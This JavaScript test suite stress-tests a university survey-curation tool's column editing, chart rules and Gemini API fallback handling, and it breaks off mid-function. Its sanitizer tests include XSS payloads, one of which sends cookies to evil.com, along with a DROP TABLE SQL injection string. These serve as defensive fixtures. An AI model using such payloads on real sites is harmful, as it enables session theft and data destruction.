/**
 * Adversarial Challenger M2-2 Stress Test Suite
 * Biro Statistika BEM Universitas Diponegoro
 * 
 * Comprehensive Stress & Resilience Testing:
 * 1. Curation State Mutations Stress Testing:
 *    - Empty strings, whitespace, tabs, newlines, multi-space normalization.
 *    - Cross-Site Scripting (XSS) vectors, HTML injection, event handlers.
 *    - Unicode RTL spoofing, zero-width spaces, Emojis, SQL injection strings.
 *    - Extreme string lengths (100,000 chars) latency & memory benchmark.
 *    - Strict immutability and property preservation.
 *    - Truthy/falsy coercion for exclusion toggling.
 *    - Rapid toggle stress testing (10,000 iterations).
 *    - Out-of-bounds, negative, empty, and single-item reorder handling.
 *    - Head-to-tail, tail-to-head, and identity shifts.
 *    - Large scale (500 columns, 500 permutations) index integrity & zero loss.
 *    - Prohibited chart rejection across all 7 banned types and case variants.
 *    - Chart type coupling with exclusion state.
 * 2. Gemini Hybrid Engine Resilience & Graceful Offline Fallback:
 *    - Zero PII payload invariant on real datasets.
 *    - Descriptive offline summaries across all question types (Binary, Nominal, Likert, Multi-Select, Text, PII).
 *    - Network failure / DNS resolution error.
 *    - Request timeout / AbortSignal triggering.
 *    - HTTP 403 Invalid API key.
 *    - HTTP 429 Quota exhausted.
 *    - HTTP 500/502/503 Internal server error.
 *    - Malformed / truncated JSON responses.
 *    - Empty candidate arrays and null/empty parts.
 *    - Model safety filter blocks (finishReason: "SAFETY").
 *    - Browser offline detection (navigator.onLine = false).
 *    - Empty and whitespace API keys (zero network call verification).
 *    - Concurrent / racing API request handling.
 *    - Zero/empty distribution statistics division-by-zero resilience.
 *    - LocalStorage SecurityError / access restriction resilience.
 *    - Successful API response integration.
 */

const fs = require('fs');
const path = require('path');
const assert = require('assert');
const esbuild = require('esbuild');

console.log('========================================================================');
console.log('  ADVERSARIAL CHALLENGER M2-2: CURATION & GEMINI RESILIENCE STRESS TEST');
console.log('========================================================================\n');

// 1. Compile TypeScript source modules in memory via esbuild
console.log('[Setup] Compiling TypeScript source modules in memory via esbuild...');
const bundleResult = esbuild.buildSync({
  stdin: {
    contents: `
      export * from './src/core/recommender/prohibitedRules';
      export * from './src/core/recommender/chartHeuristics';
      export * from './src/services/geminiService';
      export * from './src/core/profiler/statistics';
      export * from './src/core/parser/csvParser';
      export * from './src/core/parser/piiFilter';
      export * from './src/services/demoDataService';
    `,
    resolveDir: path.resolve(__dirname, '..'),
    loader: 'ts',
  },
  bundle: true,
  write: false,
  format: 'cjs',
  platform: 'node',
});

const moduleExports = {};
const runnerFn = new Function('module', 'exports', 'require', bundleResult.outputFiles[0].text);
runnerFn(moduleExports, (moduleExports.exports = {}), require);

const {
  PROHIBITED_CHARTS,
  isChartTypeProhibited,
  getProhibitionReason,
  validateChartSelection,
  getAllowedPublicChartTypes,
  determineRecommendedChart,
  getRecommendationRationale,
  getCompatibleChartAlternatives,
  overrideChartType,
  updateColumnTitle,
  toggleColumnExclusion,
  reorderColumns,
  buildGeminiPrompt,
  resolveNarrativeWithFallback,
  fetchGeminiNarrative,
  generateOfflineSummary,
  calculateLikertStats,
  sanitizeHeader,
  loadDemoSurvey1,
  loadDemoSurvey2,
  getStoredGeminiApiKey,
  setStoredGeminiApiKey,
  clearStoredGeminiApiKey,
  isGeminiKeyConfigured,
} = moduleExports.exports;

console.log('✓ Modules compiled and loaded successfully.\n');

let totalTests = 0;
let passedTests = 0;
const failures = [];

function runTest(testName, fn) {
  totalTests++;
  try {
    fn();
    passedTests++;
    console.log(`  ✓ PASS: ${testName}`);
  } catch (err) {
    console.error(`  ✗ FAIL: ${testName}`);
    console.error(`    Error: ${err.message}`);
    failures.push({ testName, error: err.message, stack: err.stack });
  }
}

async function runAsyncTest(testName, fn) {
  totalTests++;
  try {
    await fn();
    passedTests++;
    console.log(`  ✓ PASS: ${testName}`);
  } catch (err) {
    console.error(`  ✗ FAIL: ${testName}`);
    console.error(`    Error: ${err.message}`);
    failures.push({ testName, error: err.message, stack: err.stack });
  }
}

const createMockColumn = (overrides = {}) => ({
  id: 'col_mock_1',
  columnIndex: 0,
  rawName: '  Fakultas Mahasiswa  ',
  cleanName: 'Fakultas Mahasiswa',
  displayTitle: 'Fakultas Mahasiswa',
  type: 'NOMINAL_DEMOGRAPHIC',
  isPII: false,
  isExcluded: false,
  recommendedChart: 'horizontal_bar',
  selectedChart: 'horizontal_bar',
  totalResponses: 100,
  validResponses: 100,
  missingResponses: 0,
  uniqueValuesCount: 4,
  distribution: { 'FSM': 40, 'FT': 30, 'FEB': 20, 'FH': 10 },
  offlineSummary: 'Mayoritas responden memilih FSM.',
  ...overrides,
});

(async () => {
  // ==========================================================================
  // SECTION 1: Curation Mutation Stress Testing
  // ==========================================================================
  console.log('--- SECTION 1: Curation Mutation Stress Testing ---');

  // 1.1 updateColumnTitle: Empty, whitespace, tabs, newlines
  runTest('1.1: updateColumnTitle fallback to cleanName on empty or whitespace strings', () => {
    const col = createMockColumn();
    const emptyRes = updateColumnTitle(col, '');
    assert.strictEqual(emptyRes.displayTitle, col.cleanName, 'Empty string should revert to cleanName');

    const spaceRes = updateColumnTitle(col, '     ');
    assert.strictEqual(spaceRes.displayTitle, col.cleanName, 'Whitespace should revert to cleanName');

    const tabNewlineRes = updateColumnTitle(col, '\t\n  \r\n ');
    assert.strictEqual(tabNewlineRes.displayTitle, col.cleanName, 'Tabs and newlines should revert to cleanName');
  });

  // 1.2 updateColumnTitle: Whitespace collapsing & trimming
  runTest('1.2: updateColumnTitle collapses multiple internal spaces and trims edges', () => {
    const col = createMockColumn();
    const res = updateColumnTitle(col, '   Distribusi    Fakultas    BEM   UNDIP   ');
    assert.strictEqual(res.displayTitle, 'Distribusi Fakultas BEM UNDIP');
  });

  // 1.3 updateColumnTitle: XSS vectors & special characters
  runTest('1.3: updateColumnTitle safely handles malicious XSS scripts and HTML injections', () => {
    const col = createMockColumn();
    const xssPayloads = [
      "<script>alert('XSS')</script>",
      '<img src="x" onerror="alert(1)">',
      '<svg onload=alert(1)>',
      'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
      '"><script>document.location="http://evil.com/?c="+document.cookie</script>',
      '<iframe src="javascript:alert(1)"></iframe>',
    ];

    for (const payload of xssPayloads) {
      const res = updateColumnTitle(col, payload);
      assert.ok(typeof res.displayTitle === 'string', 'Result must be a string');
      assert.ok(res.displayTitle.length > 0, 'Display title must be non-empty');
      assert.strictEqual(col.displayTitle, 'Fakultas Mahasiswa', 'Original column must remain unchanged');
    }
  });

  // 1.4 updateColumnTitle: SQL injection, Unicode, RTL, Emoji, surrogate pairs
  runTest('1.4: updateColumnTitle handles SQL injection, Unicode RTL, Emojis, and null bytes', () => {
    const col = createMockColumn();
    const unicodePayloads = [
      "'; DROP TABLE survey_responses; --",
      '📊 Evaluasi Program Kerja BEM UNDIP 2026 🎯',
      '\u202E\u202Dمرحبا\u202C\u202C RTL Text',
      'Null \u0000 byte in string',
      'Zalgo text: H̶̛̗ẹ̶̋l̵̥̇l̴̰̈́o̷͈̎',
    ];

    for (const payload of unicodePayloads) {
      const res = updateColumnTitle(col, payload);
      assert.ok(typeof res.displayTitle === 'string');
      assert.ok(res.displayTitle.length > 0);
    }
  });

  // 1.5 updateColumnTitle: Extreme length stress test (100,000 chars)
  runTest('1.5: updateColumnTitle processes extreme string length (100,000 chars) in < 50ms', () => {
    const col = createMockColumn();
    const hugeString = 'BEM_UNDIP_'.repeat(10000); // 100,000 chars
    const start = Date.now();
    const res = updateColumnTitle(col, hugeString);
    const duration = Date.now() - start;

    assert.ok(duration < 50, `Expected duration < 50ms, got ${duration}ms`);
    assert.strictEqual(res.displayTitle.length, 100000);
  });

  // 1.6 updateColumnTitle: Immutability and property preservation
  runTest('1.6: updateColumnTitle preserves all other properties and returns fresh reference', () => {
    const col = createMockColumn({
      likertScale: { min: 1, max: 5, labels: {}, mean: 4.2, median: 4, netPositivePercent: 82 },
      multiSelect: { totalSelections: 200, averageSelectionsPerRespondent: 2, tokenFrequencies: [] },
    });
    const updated = updateColumnTitle(col, 'Judul Baru');

    assert.notStrictEqual(updated, col, 'Must return a new object reference');
    assert.strictEqual(updated.displayTitle, 'Judul Baru');
    assert.strictEqual(updated.id, col.id);
    assert.strictEqual(updated.cleanName, col.cleanName);
    assert.strictEqual(updated.type, col.type);
    assert.strictEqual(updated.selectedChart, col.selectedChart);
    assert.deepStrictEqual(updated.likertScale, col.likertScale);
    assert.deepStrictEqual(updated.multiSelect, col.multiSelect);
  });

  // 1.7 toggleColumnExclusion: Boolean coercion & boundary values
  runTest('1.7: toggleColumnExclusion coerces truthy/falsy values cleanly to boolean', () => {
    const col = createMockColumn({ isExcluded: false });

    // Falsy inputs -> false
    assert.strictEqual(toggleColumnExclusion(col, false).isExcluded, false);
    assert.strictEqual(toggleColumnExclusion(col, undefined).isExcluded, false);
    assert.strictEqual(toggleColumnExclusion(col, null).isExcluded, false);
    assert.strictEqual(toggleColumnExclusion(col, 0).isExcluded, false);
    assert.strictEqual(toggleColumnExclusion(col, '').isExcluded, false);
    assert.strictEqual(toggleColumnExclusion(col, NaN).isExcluded, false);

    // Truthy inputs -> true
    assert.strictEqual(toggleColumnExclusion(col, true).isExcluded, true);
    assert.strictEqual(toggleColumnExclusion(col, 1).isExcluded, true);
    assert.strictEqual(toggleColumnExclusion(col, 'true').isExcluded, true);
    assert.strictEqual(toggleColumnExclusion(col, {}).isExcluded, true);
  });

  // 1.8 toggleColumnExclusion: Rapid alternating toggle stress test (10,000 iterations)
  runTest('1.8: toggleColumnExclusion rapid toggle stress test (10,000 iterations)', () => {
    let col = createMockColumn({ isExcluded: false });
    const original = { ...col };

    for (let i = 0; i < 10000; i++) {
      col = toggleColumnExclusion(col, i % 2 === 0);
    }
    assert.strictEqual(col.isExcluded, false);
    assert.strictEqual(col.cleanName, original.cleanName);
    assert.strictEqual(col.id, original.id);
  });

  // 1.9 reorderColumns: Negative and out-of-bounds index resilience
  runTest('1.9: reorderColumns safely returns original array when indices are out of bounds or negative', () => {
    const cols = [
      { id: 'c0', columnIndex: 0 },
      { id: 'c1', columnIndex: 1 },
      { id: 'c2', columnIndex: 2 },
    ];

    // Negative indices
    assert.deepStrictEqual(reorderColumns(cols, -1, 1), cols);
    assert.deepStrictEqual(reorderColumns(cols, 1, -1), cols);
    assert.deepStrictEqual(reorderColumns(cols, -5, -2), cols);

    // Out of bounds
    assert.deepStrictEqual(reorderColumns(cols, 0, 5), cols);
    assert.deepStrictEqual(reorderColumns(cols, 5, 0), cols);
    assert.deepStrictEqual(reorderColumns(cols, 10, 20), cols);

    // Empty array
    assert.deepStrictEqual(reorderColumns([], 0, 0), []);
    assert.deepStrictEqual(reorderColumns([], -1, 1), []);
  });

  // 1.10 reorderColumns: Boundary shifts (head to tail, tail to head, identity)
  runTest('1.10: reorderColumns performs accurate head-to-tail, tail-to-head, and identity shifts', () => {
    const cols = [
      { id: 'a', columnIndex: 0 },
      { id: 'b', columnIndex: 1 },
      { id: 'c', columnIndex: 2 },
      { id: 'd', columnIndex: 3 },
    ];

    // Head to tail (0 -> 3): expected b, c, d, a
    const headToTail = reorderColumns(cols, 0, 3);
    assert.deepStrictEqual(headToTail.map(c => c.id), ['b', 'c', 'd', 'a']);
    assert.deepStrictEqual(headToTail.map(c => c.columnIndex), [0, 1, 2, 3]);

    // Tail to head (3 -> 0): expected d, a, b, c
    const tailToHead = reorderColumns(cols, 3, 0);
    assert.deepStrictEqual(tailToHead.map(c => c.id), ['d', 'a', 'b', 'c']);
    assert.deepStrictEqual(tailToHead.map(c => c.columnIndex), [0, 1, 2, 3]);

    // Identity (1 -> 1): expected a, b, c, d
    const identity = reorderColumns(cols, 1, 1);
    assert.deepStrictEqual(identity.map(c => c.id), ['a', 'b', 'c', 'd']);
    assert.deepStrictEqual(identity.map(c => c.columnIndex), [0, 1, 2, 3]);
  });

  // 1.11 reorderColumns: High-volume randomized reordering stress (500 columns, 500 permutations)
  runTest('1.11: reorderColumns preserves all elements and strict indexing under 500 permutations', () => {
    const N = 500;
    let list = Array.from({ length: N }, (_, i) => ({ id: `col_${i}`, columnIndex: i }));
    const originalIdsSet = new Set(list.map(c => c.id));

    for (let step = 0; step < 500; step++) {
      const from = (step * 37) % N;
      const to = (step * 73) % N;
      list = reorderColumns(list, from, to);
    }

    assert.strictEqual(list.length, N, 'Length must remain invariant');
    const resultIdsSet = new Set(list.map(c => c.id));
    assert.strictEqual(resultIdsSet.size, N, 'Zero duplicate IDs');
    assert.deepStrictEqual(resultIdsSet, originalIdsSet, 'All original elements must be retained');

    // Strict sequential columnIndex invariant: 0, 1, 2, ..., N-1
    for (let i = 0; i < N; i++) {
      assert.strictEqual(list[i].columnIndex, i, `columnIndex at ${i} must equal ${i}`);
    }
  });

  // 1.12 overrideChartType: Comprehensive prohibited chart rejection
  runTest('1.12: overrideChartType throws on all prohibited chart variants', () => {
    const col = createMockColumn();
    const prohibitedVariants = [
      'radar', 'spider', '3d_pie_wedge', '3d_pie', 'dual_y_axis', 'bubble', '3d_surface',
      'RADAR', 'Spider', ' 3d_pie ', 'DUAL_Y_AXIS',
    ];

    for (const variant of prohibitedVariants) {
      assert.throws(
        () => overrideChartType(col, variant),
        /strictly prohibited/i,
        `Must throw for prohibited chart: ${variant}`
      );
    }
  });

  // 1.13 overrideChartType: Coupling with isExcluded state
  runTest('1.13: overrideChartType correctly couples selectedChart with isExcluded', () => {
    const col = createMockColumn({ selectedChart: 'horizontal_bar', isExcluded: false });

    const noneRes = overrideChartType(col, 'none');
    assert.strictEqual(noneRes.selectedChart, 'none');
    assert.strictEqual(noneRes.isExcluded, true, 'Selecting none must automatically set isExcluded=true');

    const donutRes = overrideChartType(noneRes, 'donut');
    assert.strictEqual(donutRes.selectedChart, 'donut');
    assert.strictEqual(donutRes.isExcluded, false, 'Selecting valid chart must set isExcluded=false');
  });

  // ==========================================================================
  // SECTION 2: Gemini API Resilience & Offline Fallback Simulation
  // ==========================================================================
  console.log('\n--- SECTION 2: Gemini API Resilience & Offline Fallback Simulation ---');

  // 2.1 Zero PII Payload Invariant
  runTest('2.1: buildGeminiPrompt strictly complies with Zero PII guarantee', () => {
    const demo1 = loadDemoSurvey1();
    for (const col of demo1.columns) {
      const promptStr = buildGeminiPrompt(col);
      const parsed = JSON.parse(promptStr);

      assert.ok(parsed.question, 'Must contain question title');
      assert.ok(parsed.distribution, 'Must contain distribution');
      assert.ok(!parsed.rawRows, 'Must NOT contain raw individual rows');
      assert.ok(!parsed.nama, 'Must NOT contain student name');
      assert.ok(!parsed.nim, 'Must NOT contain student NIM');
    }
  });

  // 2.2 resolveNarrativeWithFallback: Offline summaries for all question types
  runTest('2.2: resolveNarrativeWithFallback generates valid summaries for all question types', () => {
    const types = [
      'DICHOTOMOUS_BINARY',
      'NOMINAL_DEMOGRAPHIC',
      'LIKERT_SCALE',
      'MULTI_SELECT_CHECKBOX',
      'OPEN_ENDED_TEXT',
      'METADATA_PII',
    ];

    for (const t of types) {
      const col = createMockColumn({
        type: t,
        likertScale: t === 'LIKERT_SCALE' ? { min: 1, max: 4, labels: {}, mean: 3.2, median: 3, netPositivePercent: 75 } : undefined,
        multiSelect: t === 'MULTI_SELECT_CHECKBOX' ? {
          totalSelections: 150,
          averageSelectionsPerRespondent: 1.5,
          tokenFrequencies: [{ token: 'Advokasi', count: 80, percentage: 80 }],
        } : undefined,
      });

      const res = resolveNarrativeWithFallback(col, '', true);
      assert.strictEqual(res.isOfflineFallback, true);
      assert.ok(typeof res.narrative === 'string');
      assert.ok(res.narrative.length > 10, `Summary for ${t} must be descriptive`);
    }
  });

  // 2.3 Division by Zero and Empty Distribution Resilience
  runTest('2.3: generateOfflineSummary handles 0 validResponses and empty distribution without NaN/throwing', () => {
    const colZero = createMockColumn({
      validResponses: 0,
      totalResponses: 0,
      distribution: {},
      likertScale: { min: 1, max: 4, labels: {}, mean: 0, median: 0, netPositivePercent: 0 },
      multiSelect: { totalSelections: 0, averageSelectionsPerRespondent: 0, tokenFrequencies: [] },
    });

    const summaryNominal = generateOfflineSummary({
      type: 'NOMINAL_DEMOGRAPHIC',
      title: colZero.displayTitle,
      totalResponses: 0,
      validResponses: 0,
      distribution: {},
    });
    assert.ok(summaryNominal.includes('Tidak ada data valid'));

    const summaryLikert = generateOfflineSummary({
      type: 'LIKERT_SCALE',
      title: colZero.displayTitle,
      totalResponses: 0,
      validResponses: 0,
      distribution: {},
      likertStats: colZero.likertScale,
    });
    assert.ok(!summaryLikert.includes('NaN'), 'Likert summary must not contain NaN');

    const summaryMulti = generateOfflineSummary({
      type: 'MULTI_SELECT_CHECKBOX',
      title: colZero.displayTitle,
      totalResponses: 0,
      validResponses: 0,
      distribution: {},
      multiSelectStats: {
        totalSelections: 0,
        averageSelectionsPerRespondent: 0,
        tokenFrequencies: [],
        uniqueTokensCount: 0,
        tokenRepeatRatio: 0,
      },
    });
    assert.ok(summaryMulti.includes('Tidak ada opsi'));
  });

  // Global Mocking Infrastructure
  const originalFetch = global.fetch;
  const originalOnLineDescriptor = Object.getOwnPropertyDescriptor(global.navigator, 'onLine');

  function restoreGlobals() {
    global.fetch = originalFetch;
    if (originalOnLineDescriptor) {
      Object.defineProperty(global.navigator, 'onLine', originalOnLineDescriptor);
    } else {
      try {
        delete global.navigator.onLine;
      } catch (e) {
        Object.defineProperty(global.navigator, 'onLine', { value: undefined, configurable: true });
      }
    }
  }

  // 2.4 Failure Simulation: Network Failure / DNS resolution error
  await runAsyncTest('2.4: fetchGeminiNarrative recovers gracefully from Network / DNS failure', async () => {
    global.fetch = () => Promise.reject(new TypeError('Failed to fetch: getaddrinfo ENOTFOUND generativelanguage.googleapis.com'));
    try {
      const col = createMockColumn();
      const res = await fetchGeminiNarrative(col, 'test_api_key_valid_format_123', 5000);

      assert.strictEqual(res.isOfflineFallback, true, 'Must fall back to offline');
      assert.ok(res.narrative.includes('FSM'), 'Narrative must contain offline summary');
      assert.ok(res.error, 'Error field must record the error');
      assert.ok(res.error.includes('Failed to fetch'));
    } finally {
      restoreGlobals();
    }
  });

  // 2.5 Failure Simulation: Request Timeout / AbortSignal
  await runAsyncTest('2.5: fetchGeminiNarrative recovers gracefully from Request Timeout Abort', async () => {
    global.fetch = (url, options) => {
      return new Promise((resolve, reject) => {
        if (options && options.signal) {
          options.signal.addEventListener('abort', () => {
            const err = new Error('The operation was aborted');
            err.name = 'AbortError';
            reject(err);
          });
        }
      });
    };

    try {
      const col = createMockColumn();
      const res = await fetchGeminiNarrative(col, 'test_api_key_valid_format_123', 20);

      assert.strictEqual(res.isOfflineFallback, true);
      assert.ok(res.narrative.includes('FSM'));
      assert.ok(res.error.includes('aborted'));
    } finally {
      restoreGlobals();
    }
  });

  // 2.6 Failure Simulation: HTTP 403 Forbidden / Invalid API Key
  await runAsyncTest('2.6: fetchGeminiNarrative recovers gracefully from HTTP 403 Invalid API Key', async () => {
    global.fetch = () => Promise.resolve({
      ok: false,
      status: 403,
      text: () => Promise.resolve(JSON.stringify({
        error: { code: 403, message: 'The provided API key is invalid or has expired.' },
      })),
    });

    try {
      const col = createMockColumn();
      const res = await fetchGeminiNarrative(col, 'AIzaSyInvalidKey12345', 5000);

      assert.strictEqual(res.isOfflineFallback, true);
      assert.ok(res.narrative.includes('FSM'));
      assert.ok(res.error.includes('403'));
    } finally {
      restoreGlobals();
    }
  });

  // 2.7 Failure Simulation: HTTP 429 Too Many Requests / Quota Exhausted
  await runAsyncTest('2.7: fetchGeminiNarrative recovers gracefully from HTTP 429 Quota Exhausted', async () => {
    global.fetch = () => Promise.resolve({
      ok: false,
      status: 429,
      text: () => Promise.resolve(JSON.stringify({
        error: { code: 429, message: 'Resource has been exhausted (e.g. check quota).' },
      })),
    });

    try {
      const col = createMockColumn();
      const res = await fetchGeminiNarrative(col, 'AIzaSyQuotaExhaustedKey', 5000);

      assert.strictEqual(res.isOfflineFallback, true);
      assert.ok(res.narrative.includes('FSM'));
      assert.ok(res.error.includes('429'));
    } finally {
      restoreGlobals();
    }
  });

  // 2.8 Failure Simulation: HTTP 500 / 502 / 503 Internal Server Error
  await runAsyncTest('2.8: fetchGeminiNarrative recovers gracefully from HTTP 500 Server Error', async () => {
    global.fetch = () => Promise.resolve({
      ok: false,
      status: 500,
      text: () => Promise.resolve('Internal server error from upstream model endpoint'),
    });

    try {
      const col = createMockColumn();
      const res = await fetchGeminiNarrative(col, 'test_key', 5000);

      assert.strictEqual(res.isOfflineFallback, true);
      assert.ok(res.narrative.includes('FSM'));
      assert.ok(res.error.includes('500'));
    } finally {
      restoreGlobals();
    }
  });

  // 2.9 Failure Simulation: Malformed JSON / Unexpected end of input
  await runAsyncTest('2.9: fetchGeminiNarrative recovers gracefully from malformed JSON response', async () => {
    global.fetch = () => Promise.resolve({
      ok: true,
      status: 200,
      json: () => Promise.reject(new SyntaxError('Unexpected token < in JSON at position 0')),
    });

    try {
      const col = createMockColumn();
      const res = await fetchGeminiNarrative(col, 'test_key', 5000);

      assert.strictEqual(res.isOfflineFallback, true);
      assert.ok(res.narrative.includes('FSM'));
      assert.ok(res.error.includes('JSON'));
    } finally {
      restoreGlobals();
    }
  });

  // 2.10 Failure Simulation: Empty Candidates Array or Object
  await runAsyncTest('2.10: fetchGeminiNarrative recovers gracefully from empty candidates array / object', async () => {
    const emptyPayloads = [
      {},
      { candidates: [] },
      { candidates: [{}] },
      { candidates: [{ content: {} }] },
      { candidates: [{ content: { parts: [] } }] },
      { candidates: [{ content: { parts: [{ text: '' }] } }] },
      { candidates: [{ content: { parts: [{ text: '   ' }] } }] },
    ];

    for (const payload of emptyPayloads) {
      global.fetch = () => Promise.resolve({
        ok: true,
        status: 200,
        json: () => Promise.resolve(payload),
      });

      try {
        const col = createMockColumn();
        const res = await fetchGeminiNarrative(col, 'test_key', 5000);

        assert.strictEqual(res.isOfflineFallback, true, `Must fall back on empty payload: ${JSON.stringify(payload)}`);
        assert.ok(res.narrative.includes('FSM'));
        assert.ok(res.error.includes('kosong'));
      } finally {
        restoreGlobals();
      }
    }
  });

  // 2.11 Failure Simulation: Gemini Safety Filter Triggered (finishReason: "SAFETY")
  await runAsyncTest('2.11: fetchGeminiNarrative recovers gracefully when model triggers SAFETY block', async () => {
    global.fetch = () => Promise.resolve({
      ok: true,
      status: 200,
      json: () => Promise.resolve({
        candidates: [
          {
            finishReason: 'SAFETY',
            safetyRatings: [{ category: 'HARM_CATEGORY_DANGEROUS_CONTENT', probability: 'HIGH' }],
          },
        ],
      }),
    });

    try {
      const col = createMockColumn();
      const res = await fetchGeminiNarrative(col, 'test_key', 5000);

      assert.strictEqual(res.isOfflineFallback, true);
      assert.ok(res.narrative.includes('FSM'));
      assert.ok(res.error.includes('kosong'));
    } finally {
      restoreGlobals();
    }
  });

  // 2.12 Browser Offline State: navigator.onLine = false
  await runAsyncTest('2.12: fetchGeminiNarrative immediately returns offline summary when navigator.onLine = false', async () => {
    let fetchCalled = false;
    global.fetch = () => {
      fetchCalled = true;
      return Promise.resolve({ ok: true, json: () => Promise.resolve({}) });
    };

    // Correctly define onLine on navigator via Object.defineProperty
    Object.defineProperty(global.navigator, 'onLine', {
      value: false,
      configurable: true,
      writable: true,
    });

    try {
      const col = createMockColumn();
      const res = await fetchGeminiNarrative(col, 'valid_key_123', 5000);

      assert.strictEqual(fetchCalled, false, 'Fetch MUST NOT be called when navigator.onLine is false');
      assert.strictEqual(res.isOfflineFallback, true);
      assert.ok(res.narrative.includes('FSM'));
    } finally {
      restoreGlobals();
    }
  });

  // 2.13 Empty / Whitespace API Key: No fetch invocation
  await runAsyncTest('2.13: fetchGeminiNarrative immediately returns offline summary for blank/whitespace key', async () => {
    let fetchCalled = false;
    global.fetch = () => {
      fetchCalled = true;
      return Promise.resolve({ ok: true, json: () => Promise.resolve({}) });
    };

    try {
      const col = createMockColumn();
      const res1 = await fetchGeminiNarrative(col, '', 5000);
      assert.strictEqual(fetchCalled, false);
      assert.strictEqual(res1.isOfflineFallback, true);

      const res2 = await fetchGeminiNarrative(col, '   \t  ', 5000);
      assert.strictEqual(fetchCalled, false);
      assert.strictEqual(res2.isOfflineFallback, true);
    } finally {
      restoreGlobals();
    }
  });

  // 2.14 Concurrent / Racing API Request Resilience
  await runAsyncTest('2.14: fetchGeminiNarrative handles concurrent racing requests without state collision', async () => {
    let callCounter = 0;
    global.fetch = () => {
      const currentCall = ++callCounter;
      return new Promise((resolve) => {
        setTimeout(() => {
          resolve({
            ok: true,
            status: 200,
            json: () => Promise.resolve({
              candidates: [
                {
                  content: {
                    parts: [{ text: `Respons hasil analisis panggilan ke-${currentCall}.` }],
                  },
                },
              ],
            }),
          });
        }, 10 * (3 - currentCall)); // Invert response order to test racing
      });
    };

    try {
      const colA = createMockColumn({ displayTitle: 'Pertanyaan A' });
      const colB = createMockColumn({ displayTitle: 'Pertanyaan B' });

      const [resA, resB] = await Promise.all([
        fetchGeminiNarrative(colA, 'key_123', 5000),
        fetchGeminiNarrative(colB, 'key_123', 5000),
      ]);

      assert.strictEqual(resA.isOfflineFallback, false);
      assert.strictEqual(resB.isOfflineFallback, false);
      assert.ok(resA.narrative.includes('[Gemini AI]'));
      assert.ok(resB.narrative.includes('[Gemini AI]'));
      assert.notStrictEqual(resA.narrative, resB.narrative, 'Concurrent responses must remain distinct');
    } finally {
      restoreGlobals();
    }
  });

  // 2.15 Happy Path: Valid HTTP 200 with Candidate Text
  await runAsyncTest('2.15: fetchGeminiNarrative returns AI narrative when API call succeeds', async () => {
    const mockAiText = 'FSM menjadi fakultas kontributor responden terbanyak dalam survei ini.';
    global.fetch = () => Promise.resolve({
      ok: true,
      status: 200,
      json: () => Promise.resolve({
        candidates: [
          {
            content: {
              parts: [{ text: mockAiText }],
            },
          },
        ],
      }),
    });

    try {
      const col = createMockColumn();
      const res = await fetchGeminiNarrative(col, 'valid_key_xyz', 5000);

      assert.strictEqual(res.isOfflineFallback, false);
      assert.strictEqual(res.narrative, `[Gemini AI] ${mockAiText}`);
      assert.strictEqual(res.error, undefined);
    } finally {
      restoreGlobals();
    }
  });

  // 2.16 HTTP 400 Bad Request Simulation
  await runAsyncTest('2.16: fetchGeminiNarrative recovers gracefully from HTTP 400 Bad Request', async () => {
    global.fetch = () => Promise.resolve({
      ok: false,
      status: 400,
      text: () => Promise.resolve(JSON.stringify({
        error: { code: 400, message: 'Invalid argument format in request payload.' },
      })),
    });

    try {
      const col = createMockColumn();
      const res = await fetchGeminiNarrative(col, 'AIzaSy_BAD_REQUEST_TEST', 5000);

      assert.strictEqual(res.isOfflineFallback, true);
      assert.ok(res.narrative.includes('FSM'));
      assert.ok(res.error.includes('400'));
    } finally {
      restoreGlobals();
    }
  });

  // ==========================================================================
  // SECTION 3: 50+ Columns Curation Mutation Stress Pipeline
  // ==========================================================================
  console.log('\n--- SECTION 3: 50+ Columns Curation Mutation Stress Pipeline ---');

  function generateSynthetic60Columns() {
    const cols = [];
    const piiHeaders = [
      'Timestamp',
      'Nama Lengkap Mahasiswa',
      'Nomor Induk Mahasiswa (NIM)',
      'Alamat Email Undip',
      'Nomor WhatsApp Aktif',
    ];
    piiHeaders.forEach((name, idx) => {
      cols.push({
        id: `col_pii_${idx}`,
        columnIndex: cols.length,
        rawName: `  ${name}  `,
        cleanName: name,
        displayTitle: name,
        type: 'METADATA_PII',
        isPII: true,
        isExcluded: true,
        recommendedChart: 'none',
        selectedChart: 'none',
        totalResponses: 250,
        validResponses: 250,
        missingResponses: 0,
        uniqueValuesCount: 250,
        distribution: {},
        offlineSummary: 'Kolom metadata sistem/identitas responden.',
      });
    });

    for (let i = 1; i <= 10; i++) {
      const name = `Pertanyaan Biner Ke-${i}: Apakah Anda setuju dengan kebijakan kampus?`;
      cols.push({
        id: `col_binary_${i}`,
        columnIndex: cols.length,
        rawName: name,
        cleanName: name,
        displayTitle: name,
        type: 'DICHOTOMOUS_BINARY',
        isPII: false,
        isExcluded: false,
        recommendedChart: 'donut',
        selectedChart: 'donut',
        totalResponses: 250,
        validResponses: 245,
        missingResponses: 5,
        uniqueValuesCount: 2,
        distribution: { 'Ya': 180 + i, 'Tidak': 65 - i },
        offlineSummary: 'Sebanyak 73.5% responden memilih Ya.',
      });
    }

    const faculties = ['FSM', 'FT', 'FEB', 'FH', 'FISIP', 'FIB', 'FK', 'FPP', 'FPIK', 'FKM', 'Psikologi', 'SV'];
    for (let i = 1; i <= 15; i++) {
      const isShort = i <= 5;
      const name = isShort ? `Demografi ${i}: Jenjang Studi` : `Demografi ${i}: Distribusi Asal Fakultas Mahasiswa Angkatan 2024`;
      const uniqueCount = isShort ? 3 : 12;
      const recChart = isShort ? 'donut' : 'horizontal_bar';
      const dist = {};
      faculties.slice(0, uniqueCount).forEach((f, fIdx) => { dist[f] = 20 + fIdx * 2; });

      cols.push({
        id: `col_nominal_${i}`,
        columnIndex: cols.length,
        rawName: name,
        cleanName: name,
        displayTitle: name,
        type: 'NOMINAL_DEMOGRAPHIC',
        isPII: false,
        isExcluded: false,
        recommendedChart: recChart,
        selectedChart: recChart,
        totalResponses: 250,
        validResponses: 250,
        missingResponses: 0,
        uniqueValuesCount: uniqueCount,
        distribution: dist,
        offlineSummary: 'Mayoritas responden memilih FSM.',
      });
    }

    for (let i = 1; i <= 15; i++) {
      const maxScale = i % 2 === 0 ? 5 : 4;
      const name = `Skala Likert ${i}: Evaluasi Kinerja Advokasi BEM UNDIP (1-${maxScale})`;
      const dist = maxScale === 5
        ? { '1': 10, '2': 25, '3': 60, '4': 95, '5': 60 }
        : { '1': 15, '2': 35, '3': 110, '4': 90 };
      const likertStats = calculateLikertStats(dist, maxScale);

      cols.push({
        id: `col_likert_${i}`,
